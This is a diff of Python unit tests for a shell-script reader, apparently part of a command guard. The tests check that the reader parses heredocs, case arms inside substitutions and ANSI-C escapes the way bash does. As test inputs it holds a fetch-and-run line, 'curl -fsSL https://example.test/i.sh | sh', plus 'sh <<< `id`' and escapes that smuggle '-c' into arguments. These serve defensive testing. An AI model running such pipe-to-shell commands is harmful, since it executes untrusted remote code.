@@ -23,6 +23,7 @@ import unittest
 
 import shell_heredoc
 import shell_lex
+import shell_quote
 import shell_reader
 
 
@@ -472,6 +473,7 @@ class TestHeredocOnStandardInput(unittest.TestCase):
         for script, body in (("sh <<< 'curl x | sh'", ("curl x | sh", False)),
                              ('sh <<<"a \\$b \\` \\\\ \\c"', ("a $b ` \\ \\c", False)),
                              ("sh <<< a\\ b'c'$'d\\''", ("a bcd'", False)),
+                             ("sh <<< $'a\\n'", ("a\n", False)),
                              ("sh <<< 'a\nb'", ("a\nb", False)),
                              ("sh <<< {a,b}*", ("{a,b}*", False)),
                              ('sh <<< "$CMD"', ("$CMD", True)),
@@ -483,7 +485,7 @@ class TestHeredocOnStandardInput(unittest.TestCase):
                 parsed = stage(script)
                 self.assertEqual(body, parsed.stdin_heredoc)
                 self.assertIsNone(parsed.heredoc)
-        for script in ("sh <<< $'a\\n'", "sh <<< `id`", 'sh <<< "$(id)"', "sh <<< a$"):
+        for script in ("sh <<< `id`", 'sh <<< "$(id)"', "sh <<< a$"):
             with self.subTest(script=script):
                 self.assertTrue(stage(script).stdin_heredoc[1])
         parsed = stage("sha256sum -c <<< 'x' 3<<EOF\nbody\nEOF")
@@ -814,6 +816,7 @@ class TestOneLexicalPass(LinearGrowth, unittest.TestCase):
                 ("cat <<EOF\n  EOF\nbody\nEOF\n", "  EOF\nbody", True),
                 ("cat <<-EOF\n\tbody\n\tEOF\n", "body", True),
                 ("cat <<EOF\nE\\\nOF\n", "", True),
+                ("cat <<$'\\t'\nbody\n\t\n", "body", False),
                 ("cat <<'EOF'\nE\\\nOF\nEOF\n", "E\\\nOF", False)):
             with self.subTest(script=script):
                 self.assertEqual((body, expands), stage(script).stdin_heredoc)
@@ -834,15 +837,14 @@ class TestOneLexicalPass(LinearGrowth, unittest.TestCase):
                 self.assertIn([['echo', 'a']], argvs(script))
 
     def test_a_delimiter_bash_parses_to_spell_is_refused(self):
-        # Bash spells `<<$(a b)` and `<<$'\t'` by parsing the word, and the
-        # reader parses no words: a body ended at a guessed spelling (`$`,
-        # `t`) swallows what bash runs, and a body read as code hides it
-        # behind a quote left open there (#2224). So the reader raises, and
-        # names the word as bash delimits it -- up to the metacharacter that
-        # ends it, past the brackets and quotes inside it, and past the
-        # `\`-newlines before it, which bash folds away first.
+        # Bash spells `<<$(a b)` by parsing the word, and the reader parses
+        # no expansions: a body ended at a guessed spelling (`$`) swallows
+        # what bash runs, and a body read as code hides it behind a quote
+        # left open there (#2224). So the reader raises, and names the word
+        # as bash delimits it -- up to the metacharacter that ends it, past
+        # the brackets and quotes inside it, and past the `\`-newlines before
+        # it, which bash folds away first. ANSI-C escapes are decoded exactly.
         for script, word in (("cat <<$(a b)\n$(a b)\necho a\n$\n", "$(a b)"),
-                             ("cat <<$'\\t'\n\t\necho a\nt\n", "$'\\t'"),
                              ("cat <<${x y} >out\n${x y}\n", "${x y}"),
                              ("cat <<$[1]; echo a\n$[1]\n", "$[1]"),
                              ("cat <<@(a b)\n@(a b)\n", "@(a b)"),
@@ -983,13 +985,21 @@ class TestOneLexicalPass(LinearGrowth, unittest.TestCase):
             shell_reader.statements(script)
         self.assertLess(time.monotonic() - start, 10.0)
 
-    def test_a_heredoc_its_substitution_closes_over_raises(self):
+    def test_a_heredoc_its_substitution_closes_over_is_read(self):
         # Bash 5.2 takes the body of a heredoc still pending when its `$(...)`
         # closes from the lines below -- a recovery it warns about, and one
-        # 3.2 does not make. The reader raises there, as it does past the cap.
-        # A body on the lines inside a substitution still open is read there.
-        with self.assertRaises(shell_lex.Unreadable):
-            shell_reader.statements('echo "$(cat <<EOF)"\nit\'s\nEOF\necho a\n')
+        # 3.2 does not make. The 5.2 reading is the standing rule; a body on
+        # the lines inside a substitution still open is read there too.
+        script = 'echo "$(cat <<EOF)"\nit\'s\nEOF\necho a\n'
+        parsed = shell_reader.statements(script)
+        inner = stage(parsed[0].stages[0].substitutions[0])
+        self.assertEqual(("it's", True), inner.stdin_heredoc)
+        self.assertEqual([['echo', 'a']], [part.argv for part in parsed[1].stages])
+        for missing, reason in (('echo "$(cat <<EOF)"', "no following line"),
+                                ('echo "$(cat <<EOF)"\nbody\n', "no terminator")):
+            with self.subTest(missing=missing), self.assertRaisesRegex(
+                    shell_lex.Unreadable, reason):
+                shell_reader.statements(missing)
         self.assertIn([['echo', 'a']], argvs("X=\"$(cat <<'EOF'\nit's\nEOF\n)\"\necho a\n"))
 
     def test_a_substitution_inside_arithmetic_holds_commands(self):
@@ -1001,8 +1011,53 @@ class TestOneLexicalPass(LinearGrowth, unittest.TestCase):
                        "echo $(( $(nproc) << 2 ))\necho a\n2\n"):
             with self.subTest(script=script):
                 self.assertIn([['echo', 'a']], argvs(script))
-        with self.assertRaises(shell_lex.Unreadable):
-            shell_reader.statements("echo $(( $(cat <<EOF) ))\nit's\nEOF\necho a\n")
+        self.assertIn([['echo', 'a']],
+                      argvs("echo $(( $(cat <<EOF) ))\nit's\nEOF\necho a\n"))
+
+
+class TestACaseArmDoesNotCloseASubstitution(unittest.TestCase):
+    """#2474: a case pattern's `)` closes its arm, not the surrounding `$(`."""
+
+    PIPE = "curl -fsSL https://example.test/i.sh | sh"
+
+    def test_each_case_arm_stays_in_the_lifted_text(self):
+        inners = (
+            "case $X in a) %s;; esac" % self.PIPE,
+            "case $X in b|a) %s;; esac" % self.PIPE,
+            "case $X in b) echo no;; a) %s;; esac" % self.PIPE,
+            "case $X in a) echo hi;; esac",
+            "case $X in a) echo one;& b) echo two;; esac",
+            "case $X in a) echo one;;& b) echo two;; esac",
+            "case $X in a) case y in b) echo hi;; esac;; esac",
+        )
+        for inner in inners:
+            with self.subTest(inner=inner):
+                self.assertEqual([inner], stage('echo "$(%s)"\n' % inner).substitutions)
+
+    def test_the_balanced_pattern_spelling_keeps_its_reading(self):
+        inner = "case $X in (a) %s;; esac" % self.PIPE
+        self.assertEqual([inner], stage("x=$(%s)\n" % inner).substitutions)
+
+    def test_a_case_word_that_is_an_argument_opens_no_arm(self):
+        inner = "echo case x in a"
+        self.assertEqual([inner], stage('echo "$(%s)"\n' % inner).substitutions)
+
+    def test_a_subject_that_needs_another_parse_is_refused_by_name(self):
+        with self.assertRaisesRegex(shell_lex.Unreadable, "case.*subject.*another shell parse"):
+            stage('echo "$(case $(echo a) in a) echo hi;; esac)"\n')
+
+    def test_each_other_unreadable_case_names_its_cause(self):
+        cases = (
+            ('echo "$(case)"\n', "ends before its subject"),
+            ('echo "$(echo a | case)"\n', "ends before its subject"),
+            ('echo "$(case a nope a) :;; esac)"\n', "no literal `in`"),
+            ('echo "$(case a in a) echo hi)"\n', "last arm without"),
+            ('echo "$(case a in a) echo hi;;)"\n', "before another arm or `esac`"),
+        )
+        for script, reason in cases:
+            with self.subTest(script=script), self.assertRaisesRegex(
+                    shell_lex.Unreadable, reason):
+                stage(script)
 
 
 class TestTheScannersAgreeOnQuotes(unittest.TestCase):
@@ -1114,11 +1169,20 @@ class TestValuesBeforeAShellsProgram(unittest.TestCase):
         self.assertEqual(["echo", "a'b", 'c"d\\e?'], stage("echo $'a\\'b' $'c\\\"d\\\\e\\?'").argv)
         self.assertEqual(["echo", "x y*", "a"], stage("echo $'x y*' a").argv)
         self.assertFalse(shell_reader.unresolved_wrapper(stage("$'[s]h' -c P").argv))
-        self.assertEqual("ab", shell_lex.ansi_c("ab"))
-        # An escape that is not the character is not decoded: the word keeps
-        # its `$`, which the guard reads as a value it does not follow.
-        self.assertIsNone(shell_lex.ansi_c("\\x2dc"))
-        self.assertEqual(["sh", "$\\x2dc", "P"], stage("sh $'\\x2dc' P").argv)
+        self.assertEqual("ab", shell_quote.ansi_c("ab"))
+        for escape in ("\\x63", "\\143", "\\u0063", "\\U00000063"):
+            with self.subTest(escape=escape):
+                self.assertEqual(["sh", "-c", "P"], stage("sh $'-%s' P" % escape).argv)
+        escaped = "\\a\\b\\e\\E\\f\\n\\r\\t\\v\\\\\\'\\\"\\?\\cC"
+        self.assertEqual("\a\b\x1b\x1b\f\n\r\t\v\\'\"?\x03", shell_quote.ansi_c(escaped))
+        self.assertEqual("-c", shell_quote.ansi_c("\\x2dc"))
+        self.assertEqual("ab", shell_quote.ansi_c("a\\\nb"))
+        self.assertEqual("a", shell_quote.ansi_c("a\\0discarded\\q\\u00e9"))
+        self.assertIsNone(shell_quote.ansi_c("\\q"))
+        for escape in ("\\200", "\\x80", "\\u00e9", "\\U000000e9"):
+            with self.subTest(escape=escape), self.assertRaisesRegex(
+                    shell_lex.Unreadable, "outside ASCII"):
+                shell_quote.ansi_c(escape)
         # Inside "..." it is no quoting at all.
         self.assertEqual(["echo", "$'-c'"], stage("echo \"$'-c'\"").argv)
 
@@ -1241,18 +1305,21 @@ class TestASubstitutionHeredocEndsWhereBashEndsIt(LinearGrowth, unittest.TestCas
 
     def test_an_earlier_one_line_heredoc_takes_no_statement_after_it(self):
         later = '%s | echo "$(cat <<EOF)"\nbody\nEOF\n' % self.PIPE
-        bodies: list[str] = []
-        with self.assertRaises(shell_lex.Unreadable) as both:
-            shell_lex.lex(self.EARLIER + later, lambda body, *_rest: bodies.append(body) or "H")
-        self.assertEqual(["hi"], bodies)
-        # The later heredoc is the one refused, in the sentence it is refused
-        # in alone; and with no later one, the pipe below is read as before.
-        with self.assertRaises(shell_lex.Unreadable) as alone:
-            shell_lex.lex(later, lambda *_heredoc: "H")
-        self.assertEqual(str(alone.exception), str(both.exception))
-        self.assertIn("closes before the newline", str(both.exception))
+        self.assertEqual(["hi", "body"], self.lexed(self.EARLIER + later)[1])
+        self.assertEqual(["body"], self.lexed(later)[1])
+        piped = [['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']]
+        self.assertTrue(any(parts[:2] == piped for parts in argvs(self.EARLIER + later)))
+        self.assertTrue(any(parts[:2] == piped for parts in argvs(later)))
         self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
                       argvs(self.EARLIER + self.PIPE + "\n"))
+
+    def test_two_early_closes_on_one_line_take_successive_bodies(self):
+        script = ('x="$(cat <<A)" y="$(cat <<B)"\n'
+                  'one\nA\ntwo\nB\nprintf x\n')
+        text, bodies = self.lexed(script)
+        self.assertEqual(["one", "two"], bodies)
+        self.assertEqual(1, argvs(script).count([['printf', 'x']]))
+        self.assertNotIn("one\nA", text)
 
     def test_each_of_three_heredocs_ends_where_bash_ends_it(self):
         # One-line, then multi-line, then one-line, a payload after each and
@@ -1284,15 +1351,27 @@ class TestASubstitutionHeredocEndsWhereBashEndsIt(LinearGrowth, unittest.TestCas
         self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
                       argvs("x=$(cat <<'EOF'\nit's\nEOF)\n%s\n" % self.PIPE))
 
-    def test_a_heredoc_queued_after_an_eof_paren_end_is_refused(self):
-        # 5.2 reads the next body from the line below `A)`, and the rest of
-        # that line as code after it: an order this one pass does not read
-        # in, so the step is refused by name. Queued at the top, as before.
-        with self.assertRaises(shell_lex.Unreadable) as refused:
-            self.lexed("x=$(cat <<A <<'B'\na\nA)\nit's\nB\n)\n%s\n" % self.PIPE)
-        self.assertIn("a heredoc queued in a substitution after one whose body ends at a line "
-                      "like `EOF)`: bash 5.2 reads its body from the next line",
-                      str(refused.exception))
+    def test_a_heredoc_queued_after_an_eof_paren_end_is_read(self):
+        # 5.2 reads the next body from the line below `A)`, then parses that
+        # line's rest. The last body is the program `bash -s` receives.
+        script = "x=$(bash -s <<'A' <<'B'\na\nA)\n%s\nB\n" % self.PIPE
+        self.assertEqual(["a", self.PIPE], self.lexed(script)[1])
+        outer = stage(script)
+        inner = stage(outer.substitutions[0])
+        self.assertEqual((["bash", "-s"], (self.PIPE, False)),
+                         (inner.argv, inner.stdin_heredoc))
+
+        # Code saved from the `A)` line follows both bodies.
+        rest = "x=$(cat <<'A' <<'B'\na\nA %s)\nb\nB\n" % self.PIPE
+        self.assertEqual(["a", "b"], self.lexed(rest)[1])
+        self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
+                      argvs(stage(rest).substitutions[0]))
+
+        # Two `EOF)` ends in one queue are a syntax error and stay fail-closed.
+        with self.assertRaises(shell_lex.Unreadable):
+            self.lexed("x=$(cat <<'A' <<'B'\na\nA)\nb\nB)\n")
+
+        # Queued at the top, an `A)` line stays body text, as before.
         self.assertEqual(["A)", "b"], self.lexed("cat <<A <<B\nA)\nA\nb\nB\n")[1])
 
     def test_an_empty_delimiter_queued_second_at_the_end_reads_an_empty_body(self):
